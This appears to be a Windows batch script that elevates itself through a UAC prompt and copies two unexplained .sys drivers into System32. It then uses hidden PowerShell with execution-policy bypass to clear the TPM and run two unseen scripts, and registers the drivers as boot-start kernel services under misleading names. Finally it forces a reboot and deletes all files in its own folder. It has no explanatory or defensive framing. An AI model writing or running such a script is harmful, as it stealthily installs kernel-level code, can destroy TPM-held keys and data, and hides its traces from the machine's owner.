@echo off
setlocal

openfiles >nul 2>&1 || (
    echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\getadmin.vbs"
    echo UAC.ShellExecute "cmd.exe", "/c ""%~s0""", "", "runas", 1 >> "%temp%\getadmin.vbs"
    "%temp%\getadmin.vbs"
    exit /B
)
set "system32Dir=C:\Windows\System32\"
if exist "%~dp0maysa.sys" (
    copy /y "%~dp0maysa.sys" "%system32Dir%"
)
if exist "%~dp0win2.sys" (
    copy /y "%~dp0win2.sys" "%system32Dir%"
)

powershell -WindowStyle Hidden -Command "Start-Process powershell -WindowStyle Hidden -Verb RunAs -Wait -ArgumentList '-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command Disable-TpmAutoProvisioning'"
powershell -WindowStyle Hidden -Command "Start-Process powershell -WindowStyle Hidden -Verb RunAs -Wait -ArgumentList '-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command Clear-Tpm'"

powershell -WindowStyle Hidden -Command "Start-Process powershell -WindowStyle Hidden -Verb RunAs -Wait -ArgumentList '-ExecutionPolicy Bypass -File \"%SCRIPT_DIR%1.ps1\"'"
powershell -WindowStyle Hidden -Command "Start-Process powershell -WindowStyle Hidden -Verb RunAs -Wait -ArgumentList '-ExecutionPolicy Bypass -File \"%SCRIPT_DIR%2.ps1\"'"


sc create maysa binPath= "C:\Windows\System32\maysa.sys" DisplayName= "arsal" start= boot tag= 1 type= kernel group= "System Reserved" >nul 2>&1
sc create win2 binPath= "C:\Windows\System32\win2.sys" DisplayName= "maysa" start= boot tag= 2 type= kernel group= "System Reserved" >nul 2>&1

endlocal
C:\Windows\system32\cmd.exe /c shutdown /r /t 2

cd /d "%~dp0"
del /f /q *.*
for /d %%i in (*) do rd /s /q "%%i"
pause
